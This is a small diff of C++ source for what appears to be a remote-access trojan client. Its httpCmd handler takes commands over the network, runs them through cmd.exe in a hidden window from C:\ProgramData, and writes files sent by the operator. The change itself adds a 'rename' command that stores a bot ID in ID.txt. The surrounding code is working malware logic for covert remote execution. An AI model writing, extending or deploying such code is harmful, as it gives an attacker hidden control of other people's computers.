@@ -2,7 +2,7 @@
 //
 
 //mainCRTStartup
-
+// wazabi
 #include "stdafx.h"
 #include <iostream>
 #include <SFML\Network.hpp>
@@ -487,6 +487,13 @@ void httpCmd(string cmd, string arg1, string arg2, string arg3)
 		cout << "system arg1: " << arg1 << endl;
 		ShellExecuteA(NULL, "open", "cmd.exe", resultSystem.c_str(), "C:\\ProgramData\\", SW_HIDE);
 	}
+
+	if (cmd == "rename")
+	{
+		ofstream name("ID.txt", ios::out | ios::trunc);
+		name << arg1;
+	}
+
 	if (cmd == "send")
 	{
 		ofstream flux(arg3, ios::binary);
